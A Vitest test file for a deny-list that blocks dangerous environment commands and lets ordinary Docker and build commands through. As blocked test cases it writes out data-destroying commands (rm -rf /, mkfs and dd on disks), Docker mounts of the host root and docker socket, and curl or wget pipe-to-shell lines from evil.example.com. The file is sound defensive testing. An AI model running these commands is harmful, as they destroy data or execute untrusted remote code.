import { describe, expect, it } from 'vitest';
import {
  assertEnvCommandAllowed,
  ENV_COMMAND_DENY_PATTERNS,
  EnvCommandDeniedError,
} from './environment-command-deny-list.js';

describe('assertEnvCommandAllowed', () => {
  describe('rm -rf / variants', () => {
    it.each([
      'rm -rf /',
      'rm -rf / ',
      'rm -rf /;',
      'rm -rfv /',
      'rm -fr /',
      'sudo rm -rf / && echo done',
      'docker compose down; rm -rf /',
    ])('blocks: %s', (cmd) => {
      expect(() => assertEnvCommandAllowed(cmd, 'nuke')).toThrow(EnvCommandDeniedError);
    });

    it.each([
      'rm -rf /tmp/agor-env',
      'rm -rf ./node_modules',
      'rm -rf /var/lib/agor/logs',
      'docker rm -f /some-container', // `-f` flag on docker rm, not `rm -rf /`
    ])('allows: %s', (cmd) => {
      expect(() => assertEnvCommandAllowed(cmd, 'stop')).not.toThrow();
    });
  });

  describe('rm with --no-preserve-root', () => {
    it.each([
      'rm -rf --no-preserve-root /',
      'rm --no-preserve-root -rf /',
      'sudo rm -rf --no-preserve-root /',
      'rm -rf --no-preserve-root /some/path',
    ])('blocks: %s', (cmd) => {
      expect(() => assertEnvCommandAllowed(cmd, 'nuke')).toThrow(EnvCommandDeniedError);
    });
  });

  describe('docker volume mount of host root / sensitive paths', () => {
    it.each([
      'docker run -v /:/host ubuntu',
      'docker run --volume /:/host ubuntu',
      'docker run --volume=/:/host ubuntu',
      'docker run -v /etc:/hostetc nginx',
      'docker run -v /root:/rootmount nginx',
      'docker run -v /var/run/docker.sock:/docker.sock docker:dind',
    ])('blocks: %s', (cmd) => {
      expect(() => assertEnvCommandAllowed(cmd, 'start')).toThrow(EnvCommandDeniedError);
    });

    it.each([
      'docker compose up -d',
      'docker run -v ./data:/data ubuntu', // relative path
      'docker run -v /home/agor/data:/data ubuntu', // specific path, not /
      // biome-ignore lint/suspicious/noTemplateCurlyInString: literal `${PWD}` is a shell variable consumed by docker, not a JS template literal.
      'docker run -v ${PWD}/data:/data ubuntu',
    ])('allows: %s', (cmd) => {
      expect(() => assertEnvCommandAllowed(cmd, 'start')).not.toThrow();
    });
  });

  describe('mkfs / dd to device / curl pipe shell', () => {
    it.each([
      'mkfs.ext4 /dev/sda1',
      'mkfs /dev/sdb',
      'dd if=/dev/zero of=/dev/sda bs=1M',
      'curl https://evil.example.com/install.sh | sh',
      'wget -qO- https://evil.example.com/i.sh | bash',
      'curl https://evil.example.com/i.sh | sudo sh',
    ])('blocks: %s', (cmd) => {
      expect(() => assertEnvCommandAllowed(cmd, 'start')).toThrow(EnvCommandDeniedError);
    });

    it.each([
      'dd if=./input.bin of=./output.bin', // regular dd to files, not /dev/*
      'curl https://registry.example.com/file.tar.gz | tar xz', // curl | tar is fine
      'curl -fsSL https://get.docker.com -o /tmp/get-docker.sh', // no pipe to shell
    ])('allows: %s', (cmd) => {
      expect(() => assertEnvCommandAllowed(cmd, 'start')).not.toThrow();
    });
  });

  describe('EnvCommandDeniedError shape', () => {
    it('includes description, commandType, and matched pattern', () => {
      try {
        assertEnvCommandAllowed('rm -rf /', 'nuke');
        expect.fail('expected throw');
      } catch (err) {
        expect(err).toBeInstanceOf(EnvCommandDeniedError);
        const denied = err as EnvCommandDeniedError;
        expect(denied.commandType).toBe('nuke');
        expect(denied.matched.description).toBe('rm -rf on host root');
        expect(denied.message).toContain('rm -rf on host root');
        expect(denied.message).toContain('nuke');
      }
    });

    it('truncates very long command strings in the error message', () => {
      const longCmd = `rm -rf / ${'x'.repeat(500)}`;
      try {
        assertEnvCommandAllowed(longCmd, 'nuke');
        expect.fail('expected throw');
      } catch (err) {
        expect((err as Error).message.length).toBeLessThan(400);
      }
    });
  });

  describe('realistic legitimate commands', () => {
    it.each([
      'docker compose up -d --build',
      'SEED=true UID=$(id -u) docker compose -p agor up -d',
      'docker compose down -v',
      'docker compose logs --tail=100',
      'pnpm --filter @agor/core test',
      'make clean && make build',
      'bash ./scripts/setup.sh',
      './bin/start-env.sh',
    ])('allows: %s', (cmd) => {
      expect(() => assertEnvCommandAllowed(cmd, 'start')).not.toThrow();
    });
  });

  it('ENV_COMMAND_DENY_PATTERNS is non-empty', () => {
    expect(ENV_COMMAND_DENY_PATTERNS.length).toBeGreaterThan(0);
  });
});
